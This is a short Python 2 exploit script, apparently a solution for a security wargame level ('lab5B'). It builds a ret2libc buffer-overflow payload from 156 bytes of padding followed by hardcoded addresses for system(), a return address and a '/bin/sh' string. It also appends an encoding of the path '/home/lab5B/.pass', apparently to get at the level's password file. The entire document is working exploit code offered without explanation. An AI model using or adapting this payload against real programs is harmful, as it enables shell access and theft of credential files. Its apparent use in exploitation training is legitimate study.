import struct

def convert_to_int_le(string):
    return str(int(string[::-1].encode('hex'), 16))

shellcode = ""

SYSTEM_ADDR = struct.pack("<I", 0xb7e63190)
BIN_SH_ADDR = struct.pack("<I", 0xb7f83a24)
MAIN_RET_ADDR = struct.pack("<I", 0xb7e3ca83)
JUNK = "A" * 156

shellcode += JUNK
# Stack frame for calling system()
shellcode += SYSTEM_ADDR
shellcode += MAIN_RET_ADDR
shellcode += BIN_SH_ADDR
shellcode += convert_to_int_le("/hom")
shellcode += convert_to_int_le("e/la")
shellcode += convert_to_int_le("b5B/")
shellcode += convert_to_int_le(".pas")
shellcode += convert_to_int_le("s")

print shellcode
